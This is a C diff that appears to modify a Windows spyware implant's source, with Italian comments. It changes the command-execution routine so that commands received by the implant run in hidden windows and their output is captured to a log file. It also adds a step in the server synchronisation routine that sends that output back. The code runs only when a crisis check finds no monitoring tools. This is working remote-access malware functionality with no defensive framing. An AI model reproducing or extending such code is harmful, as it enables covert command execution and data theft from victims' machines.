@@ -178,6 +178,9 @@ BOOL WINAPI DA_Syncronize(BYTE *action_param)
 		hInstantActionThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FastActionsThread, NULL, 0, &dummy);
 	}
 
+	// Invia l'output dei comandi
+	LOG_SendOutputCmd(band_limit, min_sleep, max_sleep);
+
 	// Invia la coda dei log da spedire (no concorrenza con agenti)
 	// Essendo l'ultima parte del protocollo, questa funzione si occupera' anche di mandare i PROTO_BYE
 	LOG_SendLogQueue(band_limit, min_sleep, max_sleep);
@@ -245,6 +248,8 @@ BOOL WINAPI DA_Execute(BYTE *command)
 {
 	STARTUPINFO si;
     PROCESS_INFORMATION pi;
+	HANDLE hfile;
+	char cmd_line[MAX_PATH*2];
 
 	// Verifica che ci sia il comando 
 	// N.B. Deve essere NULL terminato!!!
@@ -252,15 +257,31 @@ BOOL WINAPI DA_Execute(BYTE *command)
 	if (!command || IsCrisisSystem())
 		return FALSE;
 
+	if (!HM_ExpandStrings((char *)command, cmd_line, sizeof(cmd_line)))
+		strcpy(cmd_line, (char *)command);
+
+	hfile = Log_CreateOutputFile((char *)command);
 
 	// Il processo viene lanciato con la main window
 	// nascosta
+	ZeroMemory( &pi, sizeof(pi) );
 	ZeroMemory( &si, sizeof(si) );
     si.cb = sizeof(si);
 	si.wShowWindow = SW_HIDE;
-	si.dwFlags = STARTF_USESHOWWINDOW;
-	HM_CreateProcess((char *)command, 0, &si, &pi, 0);
+	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+	si.hStdOutput = stdout;
+	si.hStdError = stderr;
+	si.hStdInput = stdin;
+	if (hfile != INVALID_HANDLE_VALUE)
+		si.hStdOutput = si.hStdError = hfile;
 
+	IndirectCreateProcess((char *)cmd_line, 0, &si, &pi, TRUE);
+	if (pi.hProcess)
+		CloseHandle(pi.hProcess);
+	if (pi.hThread)
+		CloseHandle(pi.hThread);
+	Log_CloseFile(hfile);
+		
 	// Se HM_CreateProcess fallisce, pi.dwProcessId e' settato a 0.
 	// Lo aggiunge alla lista dei processi eseguiti
 	if (pi.dwProcessId) 
